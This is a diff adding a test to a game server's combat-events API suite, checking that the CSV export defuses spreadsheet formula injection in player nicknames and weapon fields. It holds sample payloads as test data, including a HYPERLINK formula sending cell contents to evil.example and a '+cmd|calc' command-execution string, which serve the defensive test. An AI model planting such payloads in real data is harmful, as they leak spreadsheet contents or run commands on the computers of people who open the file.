@@ -309,6 +309,35 @@ describeIfDb('combat-events API (COMBAT-3)', () => {
     expect(lines[1]).toContain('TargetDummy');
   });
 
+  // Audit #137 — a player picks their own nickname; the export must not hand
+  // it to a spreadsheet as a formula.
+  it('defuses formula-looking nicknames and weapons in the CSV export', async () => {
+    const server = await seedServer(h.db, 'CombatCsvSrv');
+    const formulaName = '=HYPERLINK("http://evil.example/?"&A1,"x")';
+    const attacker = await seedPlayer(h.db, { name: formulaName });
+    const victim = await seedPlayer(h.db, { name: '@SUM(A1:A9)' });
+    await h.db.execute(sql`
+      INSERT INTO combat_events
+        (event_type, server_id, attacker_player_id, victim_player_id, weapon, attacker_kit, occurred_at)
+      VALUES
+        ('death', ${server}::uuid, ${attacker}::uuid, ${victim}::uuid,
+         '+cmd|calc', '-kit', ${BASE.toISOString()}::timestamptz)
+    `);
+
+    const res = await h.app.inject({
+      method: 'GET',
+      url: `/api/v1/combat-events/export?serverId=${server}`,
+      headers: { cookie: ownerCookie },
+    });
+    expect(res.statusCode).toBe(200);
+    const row = res.payload.trim().split('\r\n')[1] ?? '';
+    expect(row).toContain(`"'=HYPERLINK(""http://evil.example/?""&A1,""x"")"`);
+    expect(row).toContain(`"'@SUM(A1:A9)"`);
+    expect(row).toContain(`"'+cmd|calc"`);
+    expect(row).toContain(`"'-kit"`);
+    expect(row).not.toMatch(/(^|,)[=+@-][^0-9]/);
+  });
+
   it('returns vehicle_destroyed rows with a null victim player and the raw asset id', async () => {
     await h.db.execute(sql`
       INSERT INTO combat_events
